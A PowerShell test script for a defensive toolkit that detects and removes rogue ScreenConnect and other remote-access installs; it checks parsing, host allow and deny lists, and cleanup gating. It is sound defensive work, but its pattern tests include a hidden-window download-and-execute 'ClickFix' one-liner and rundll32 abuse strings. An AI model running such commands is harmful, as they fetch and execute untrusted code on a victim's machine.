# Lightweight tests (no Pester dependency). Run: pwsh -File tests\Run-Tests.ps1
$ErrorActionPreference = 'Stop'
$root = Split-Path -Parent $PSScriptRoot
$fail = 0
function Assert-Equal($Actual, $Expected, $Name) {
    if ("$Actual" -ceq "$Expected") { Write-Host "PASS  $Name" -ForegroundColor Green }
    else { Write-Host "FAIL  $Name`n      expected: $Expected`n      actual:   $Actual" -ForegroundColor Red; $script:fail++ }
}

# 1. Every script parses
foreach ($f in Get-ChildItem $root -Recurse -Include *.ps1, *.psm1) {
    $tok = $null; $err = $null
    [void][System.Management.Automation.Language.Parser]::ParseFile($f.FullName, [ref]$tok, [ref]$err)
    Assert-Equal $err.Count 0 "parses: $($f.Name)"
}

# 2. Config is valid JSON
foreach ($f in Get-ChildItem (Join-Path $root 'config') -Filter *.json) {
    $ok = $true; try { Get-Content -Raw $f.FullName | ConvertFrom-Json | Out-Null } catch { $ok = $false }
    Assert-Equal $ok $true "valid json: $($f.Name)"
}

Import-Module (Join-Path $root 'lib\RMMToolkit.Common.psm1') -Force -DisableNameChecking

# 3. ScreenConnect command line parsing
$cl = '"C:\Program Files (x86)\ScreenConnect Client (1a2b3c4d5e6f7a8b)\ScreenConnect.ClientService.exe" "?e=Access&y=Guest&h=instance-abc123-relay.screenconnect.com&p=443&s=0f1e2d3c-4b5a-6978-8796-a5b4c3d2e1f0&k=BgIAAACkAABSU0ExAAgAAAEAAQD1234567890abcdef&c=Paperless%20Post&c=&c=&t="'
$r = ConvertFrom-ScreenConnectCommandLine -CommandLine $cl
Assert-Equal $r.ClientId     '1a2b3c4d5e6f7a8b'                         'client id'
Assert-Equal $r.SessionType  'Access'                                   'e= session type'
Assert-Equal $r.ClientType   'Guest'                                    'y= client type'
Assert-Equal $r.CallbackHost 'instance-abc123-relay.screenconnect.com'  'h= host'
Assert-Equal $r.CallbackPort '443'                                      'p= port'
Assert-Equal $r.SessionId    '0f1e2d3c-4b5a-6978-8796-a5b4c3d2e1f0'     's= session'
Assert-Equal ($r.CustomProperties -join '|') 'Paperless Post'           'c= custom props (url-decoded, empties dropped)'
Assert-Equal $r.InstallFolder 'C:\Program Files (x86)\ScreenConnect Client (1a2b3c4d5e6f7a8b)' 'install folder'

$r2 = ConvertFrom-ScreenConnectCommandLine -CommandLine 'C:\x\ScreenConnect.ClientService.exe ?h=1.2.3.4&p=8041&e=Support&s=abc'
Assert-Equal $r2.CallbackHost '1.2.3.4' 'unquoted cmdline host'
Assert-Equal $r2.CallbackPort '8041'    'unquoted cmdline port'
Assert-Equal $r2.ClientId     ''        'no client id when folder name absent'

$r3 = ConvertFrom-ScreenConnectCommandLine -CommandLine ''
Assert-Equal $r3.CallbackHost '' 'empty input is safe'

# 4. Packed GUID conversion (MSI Installer\Products)
Assert-Equal (ConvertFrom-PackedGuid '1EE0D8A6A0C3B3E4D9B0E0C0F0A0B0C0') '{6A8D0EE1-3C0A-4E3B-9D0B-0E0C0F0A0B0C}' 'packed guid -> product code'
Assert-Equal (ConvertFrom-PackedGuid 'nothex') '' 'invalid packed guid -> null'

# 5. Vendor matching
$sig = (Import-ToolkitConfig -ConfigDir (Join-Path $root 'config')).Signatures
Assert-Equal (Find-RmmVendor -Signatures $sig -Text 'ScreenConnect Client (abc)' -Field services).key 'screenconnect' 'match screenconnect service'
Assert-Equal (Find-RmmVendor -Signatures $sig -Text 'AnyDesk.exe' -Field processes).key 'anydesk' 'match anydesk process'
Assert-Equal (Find-RmmVendor -Signatures $sig -Text 'Google Chrome' -Field any) '' 'no false match on chrome'

# 6. Broken config stops the run instead of silently disabling detections
$bad = Join-Path ([IO.Path]::GetTempPath()) "rmmtk-badcfg-$PID"
New-Item -ItemType Directory -Path $bad -Force | Out-Null
Copy-Item (Join-Path $root 'config\rmm-signatures.json') $bad
'{ "knownBadHosts": [ "x", ], }' | Set-Content (Join-Path $bad 'ioc-watchlist.json')
$threw = $false; try { Import-ToolkitConfig -ConfigDir $bad | Out-Null } catch { $threw = $true }
Remove-Item $bad -Recurse -Force
Assert-Equal $threw $true 'broken config throws'

# 7. Trusted hosts: exact or wildcard only; known-bad: regex
Assert-Equal (Test-HostListed 'relay.mymsp.com' @('relay.mymsp.com') -Trusted)          $true  'trusted exact'
Assert-Equal (Test-HostListed 'RELAY.mymsp.com' @('relay.mymsp.com') -Trusted)          $true  'trusted case-insensitive'
Assert-Equal (Test-HostListed 'relay.mymsp.com.evil.net' @('relay.mymsp.com') -Trusted) $false 'trusted rejects lookalike suffix'
Assert-Equal (Test-HostListed 'relay1mymsp.com' @('relay.mymsp.com') -Trusted)          $false 'trusted rejects dot-as-wildcard'
Assert-Equal (Test-HostListed 'eu.mymsp.com' @('*.mymsp.com') -Trusted)                 $true  'trusted wildcard'
Assert-Equal (Test-HostListed 'mymsp.com.evil.net' @('*.mymsp.com') -Trusted)           $false 'trusted wildcard rejects lookalike'
Assert-Equal (Test-HostListed 'x.evil.net' @($null, '') -Trusted)                       $false 'empty trusted list entries never match'
Assert-Equal (Test-HostListed 'abc-relay.evil.net' @('relay\.evil\.net$'))              $true  'known-bad regex'
Assert-Equal (Test-HostListed '' @('.*'))                                               $false 'no host never listed'

# 8b. Suspicious command patterns: built-in rundll32 tasks are not flagged, abuse is
$susp = @((Import-ToolkitConfig -ConfigDir (Join-Path $root 'config')).Watchlist.suspiciousCommandPatterns)
Assert-Equal (Test-PatternMatch '%windir%\system32\rundll32.exe %windir%\system32\PcaSvc.dll,PcaPatchSdbTask' $susp) $false 'built-in rundll32 task not suspicious'
Assert-Equal (Test-PatternMatch 'rundll32.exe C:\Users\bob\AppData\Roaming\x.dll,Start' $susp)                     $true  'rundll32 from user profile suspicious'
Assert-Equal (Test-PatternMatch 'rundll32.exe payload.dll,#1' $susp)                                               $true  'rundll32 ordinal suspicious'
Assert-Equal (Test-PatternMatch 'powershell -w hidden -c iwr http://x/a.ps1 | iex' $susp)                          $true  'ClickFix one-liner suspicious'

# 8. Cleanup scope
Assert-Equal (Test-InScope 'ScreenConnect Client (1a2b)' @('1a2b'))       $true  'in scope'
Assert-Equal (Test-InScope 'ScreenConnect Client (9f9f)' @('1a2b'))       $false 'out of scope'
Assert-Equal (Test-InScope 'ScreenConnect Client (1a2b3c)' @('1a2b'))     $false 'id prefix is not in scope'
Assert-Equal (Test-InScope 'anything' @())                                $true  'no ids = everything in scope'

# 9. Verification: items of intentionally-kept instances don't fail the check
$msp = [pscustomobject]@{ ClientId = 'aaaa1111'; InstallFolder = 'C:\Program Files (x86)\ScreenConnect Client (aaaa1111)' }
$state = [pscustomobject]@{
    Instances = @([pscustomobject]@{ ServiceName = 'ScreenConnect Client (aaaa1111)'; ClientId = 'aaaa1111' })
    OtherServices = @()
    Processes = @([pscustomobject]@{ Name = 'ScreenConnect.ClientService.exe'; ProcessId = 812; ExecutablePath = "$($msp.InstallFolder)\ScreenConnect.ClientService.exe" })
    Uninstall = @([pscustomobject]@{ DisplayName = 'ScreenConnect Client (aaaa1111)'; SystemComponent = $false },
                  [pscustomobject]@{ DisplayName = 'ScreenConnect Client (bbbb2222)'; SystemComponent = $true })
    Msi = @(); Tasks = @(); RunKeys = @(); Startup = @()
    Folders = @('C:\ProgramData\ScreenConnect', 'C:\Users\bob\AppData\Local\ScreenConnect Client (bbbb2222)')
    SystemDlls = @('C:\Windows\System32\ScreenConnect.WindowsAuthenticationPackage.dll'); LsaScreenConnect = @()
}
$rem = Write-VerificationReport $state 'test' @($msp) 6> $null
Assert-Equal ($rem -join '|') 'Installed entry: ScreenConnect Client (bbbb2222) (hidden)|Folder: C:\Users\bob\AppData\Local\ScreenConnect Client (bbbb2222)' 'verify: only attacker leftovers remain'
$rem = Write-VerificationReport $state 'test' 6> $null
Assert-Equal $rem.Count 7 'verify: without survivors everything remains'

# 10. result.json round-trips with every field the GUI reads
$tmp = Join-Path ([IO.Path]::GetTempPath()) "rmmtk-result-$PID"
New-Item -ItemType Directory -Path $tmp -Force | Out-Null
$inst = @([pscustomobject]@{ ClientId = 'aaaa1111'; CallbackHost = 'relay.mymsp.com'; CallbackPort = '443'; SessionType = 'Access' })
$conn = @([pscustomobject]@{ OwningProcess = 812; RemoteAddress = '1.2.3.4'; RemotePort = 443; State = 'Established' })
Write-ToolkitResult -Folder $tmp -Tool Triage -ExitCode 2 -Verdict Red -Instances $inst -TrustedHosts @('relay.mymsp.com') -Connections $conn `
    -Findings @([pscustomobject]@{ Severity = 'High'; Category = 'ScreenConnect'; Title = 't'; Detail = 'x' }) -NextStep 'n' -NextAction DryRun -SummaryPath 's'
$j = Get-Content -Raw (Join-Path $tmp 'result.json') | ConvertFrom-Json
Remove-Item $tmp -Recurse -Force
Assert-Equal (($j.PSObject.Properties.Name) -join ',') 'Tool,Computer,Time,ExitCode,Verdict,DryRun,Instances,Connections,Findings,NextStep,NextAction,SummaryPath' 'result: all fields'
Assert-Equal "$($j.Instances[0].ClientId) $($j.Instances[0].Trusted)" 'aaaa1111 True' 'result: single instance stays an array, trusted flag'
Assert-Equal "$($j.Connections[0].Remote) $($j.Connections[0].State)" '1.2.3.4:443 Established' 'result: connection'
Assert-Equal "$($j.Verdict) $($j.NextAction) $($j.ExitCode)" 'Red DryRun 2' 'result: verdict/next/exit'

# 11. Guided gates
$t0 = (Get-Date).AddMinutes(-10).ToString('o'); $t1 = (Get-Date).ToString('o')
$tri = [pscustomobject]@{ Tool = 'Triage'; Time = $t0; DryRun = $false }
$dry = [pscustomobject]@{ Tool = 'Cleanup'; Time = $t1; DryRun = $true }
$oldDry = [pscustomobject]@{ Tool = 'Cleanup'; Time = (Get-Date).AddHours(-1).ToString('o'); DryRun = $true }
$g = Get-ToolkitGate -Results @() -Disconnected $true
Assert-Equal "$($g.DryRunOpen) $($g.CleanupOpen)" 'False False' 'gate: fresh PC locks dry run + cleanup'
$g = Get-ToolkitGate -Results @($tri, $oldDry) -Disconnected $true
Assert-Equal "$($g.DryRunOpen) $($g.CleanupOpen)" 'True False' 'gate: dry run older than triage does not count'
$g = Get-ToolkitGate -Results @($tri, $dry) -Disconnected $true -OnlineAdapters @('Wi-Fi')
Assert-Equal "$($g.CleanupOpen) $($g.Reason)" 'False still online via: Wi-Fi' 'gate: online adapter blocks cleanup'
$g = Get-ToolkitGate -Results @($tri, $dry) -Disconnected $false
Assert-Equal $g.CleanupOpen $false 'gate: box not ticked blocks cleanup'
$g = Get-ToolkitGate -Results @($tri, $dry) -Disconnected $true
Assert-Equal $g.CleanupOpen $true 'gate: triage + dry run + offline opens cleanup'

if ($fail) { Write-Host "`n$fail test(s) failed" -ForegroundColor Red; exit 1 } else { Write-Host "`nAll tests passed" -ForegroundColor Green }
